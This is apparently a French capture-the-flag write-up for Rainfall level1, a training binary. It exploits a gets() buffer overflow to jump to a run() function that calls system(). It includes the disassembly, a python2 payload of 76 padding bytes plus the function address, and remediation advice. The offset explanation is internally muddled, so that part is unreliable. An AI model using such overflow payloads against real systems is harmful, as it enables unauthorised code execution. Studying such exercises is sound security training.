# Rainfall — Level 1

> **Exploit write-up (stylisé pour GitHub)**

---

## Sommaire

* [Contexte](#contexte)
* [Informations sur le binaire](#informations-sur-le-binaire)
* [Désassemblage important](#désassemblage-important)
* [Calcul de l'offset](#calcul-de-loffset)
* [Exploit (payload)](#exploit-payload)
* [Résultat attendu](#résultat-attendu)
* [Résumé & recommandations](#résumé--recommandations)

---

## Contexte

Ce document décrit l'analyse et l'exploitation du **level1** du challenge *Rainfall*. L'objectif est de profiter d'un **buffer overflow** causé par `gets()` pour rediriger l'exécution vers la fonction `run()` et obtenir le comportement désiré.

---

## Informations sur le binaire

* Protections : `No RELRO`, `No canary`, `NX disabled`, `No PIE`.
* Conclusion : adresse fixe en mémoire et aucune protection moderne — exploitation classique par écriture d'EIP possible.

---

## Désassemblage important

```asm
08048444 <run>:
 8048444: 55                push   %ebp
 8048445: 89 e5             mov    %esp,%ebp
 8048447: 83 ec 18          sub    $0x18,%esp
 804844a: a1 c0 97 04 08    mov    0x80497c0,%eax
 804844f: 89 c2             mov    %eax,%edx
 8048451: b8 70 85 04 08    mov    $0x8048570,%eax
 8048456: 89 54 24 0c       mov    %edx,0xc(%esp)
 804845a: c7 44 24 08 13 00 00 00  movl $0x13,0x8(%esp)
 8048462: c7 44 24 04 01 00 00 00  movl $0x1,0x4(%esp)
 804846a: 89 04 24          mov    %eax,(%esp)
 804846d: e8 de fe ff ff    call   8048350 <fwrite@plt>
 8048472: c7 04 24 84 85 04 08  movl $0x8048584,(%esp)
 8048479: e8 e2 fe ff ff    call   8048360 <system@plt>
 804847e: c9                leave
 804847f: c3                ret

08048480 <main>:
 8048480: 55                push   %ebp
 8048481: 89 e5             mov    %esp,%ebp
 8048483: 83 e4 f0          and    $0xfffffff0,%esp
 8048486: 83 ec 50          sub    $0x50,%esp        ; réserve 0x50 = 80 octets
 8048489: 8d 44 24 10       lea    0x10(%esp),%eax
 804848d: 89 04 24          mov    %eax,(%esp)
 8048490: e8 ab fe ff ff    call   8048340 <gets@plt> ; vuln
 8048495: c9                leave
 8048496: c3                ret
```

> **Remarque** : `gets()` ne vérifie pas la taille lue — source directe de **buffer overflow**.

---

## Calcul de l'offset

Le `main()` réserve `0x50` (80 octets) pour le buffer sur la pile. L'adresse de retour (EIP) se situe juste après ces 80 octets. Pour écraser EIP :

* Taille du buffer : **80 octets**
* Taille EIP (adresse de retour) : **4 octets**

**Offset à écrire avant écriture de l'adresse de retour** = `80 - 4 = 76`

---

## Exploit (payload)

Adresse de la fonction `run()` : `0x08048444`.

Payload (exemple, généré avec Python 2 pour compatibilité avec l'environnement de test) :

```bash
python2 -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/caca
(cat /tmp/caca; cat) | ./level1
```

> Variante utile pour tests interactifs :
>
> ```bash
> python2 -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/caca
> ./level1 < /tmp/caca
> ```

---

## Résultat attendu

Après exécution du payload ci‑dessus, le programme affiche :

```
Good... Wait what?
```

Ce message indique que l'exécution a été redirigée vers la fonction `run()` et que l'action désirée (appel de `system()` via `run()`) s'est produite.

---

## Résumé & recommandations

**Résumé :**

* Vulnérabilité : `gets()` → buffer overflow
* Offset : **76 octets**
* Technique : écriture directe de l'adresse de la fonction `run()` dans EIP (ret2func)
* Adresse cible : `0x08048444`

**Recommandations** :

* Remplacer `gets()` par `fgets()` ou `getline()` avec vérification de la taille.
* Activer protections modernes : PIE, NX, Fortify, Stack Canaries, RELRO.
* Pour la documentation du repo : ajouter une note expliquant la méthode d'analyse (gdb/objdump) et inclure les commandes exploit/test utilisées.

---